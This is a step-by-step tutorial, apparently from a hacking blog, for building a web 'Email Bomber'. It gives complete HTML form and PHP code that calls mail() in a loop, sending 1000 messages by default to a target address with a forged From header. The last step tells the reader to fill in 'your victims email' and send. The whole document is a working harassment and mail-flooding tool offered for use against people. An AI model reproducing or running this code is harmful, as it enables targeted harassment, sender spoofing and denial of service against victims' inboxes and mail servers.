You’ll Need:
1 Webhosting – Make Sure You Have SMTP Or It Wont Work
Small Knowledge About PHP And HTML


 
Steps:
1. So first we will want to create a file called “index.html”
2. We will place the following code  in the index.html

Code:
<html>
<head>
<title>Email Bomber</title>
</head>
<body>
  <center>
   <h1 style=”color:white;font-shadow:0px 0px 2px blue;”>Simple Email Bomber</h1><br>
         <!–This is where the forms starts–>
    <form action=”email.php” method=”post”><br>
        Email: <input type=”text” name=”email” /><br>
        Amount to send : <input type=”text” name=”spam” /><br>
        Subject: <input type=”text” name=”subject” /><br>
        Message: <TEXTAREA NAME=”message” ROWS=6 COLS=40></TEXTAREA><br>
        From: <input type=”text” name=”from” /><br>
        <input type=”submit” value=”send” /><input type=”reset” />
    </form>
   </center>
</body>
</html>

3. Go ahead and save that file in a folder, name the folder what-ever you want.
4. Now in that folder go ahead and create a file named “email.php”
5. Now open the email.php and place the following code inside it.

Code:
<?php  
 
    $num = 1;
    $email = $_POST[’email’];
    $spam = $_POST[‘spam’];
    $subject = $_POST[‘subject’];
    $message = $_POST[‘message’];
    $from = $_POST[‘from’];
    $send = $_POST[‘send’];
    if($spam==’ ‘)
    {
      $spam = 1000; // this is for if the Amount to send = nothing then it will send 1000 emails
           // you can change it too what-ever you want.
    }
   
   
    if($spam!=” && $email==”)
    {
        die(‘Please enter an email!.’);
    }
   
    if($email != ”)
    {
        while($num<=$spam)
        {
            mail ($email, $subject, $message, “From: ” . $from);
            echo $num . “<br>”;
            $num++;
        }  
    }
?>

6. Now you can go ahead and upload it to your server, and boom.

Now you should be able to go to your domain/url and find that theres a panel there, go ahead and fill it out with your victims email & the message to send/spam and press the send button.
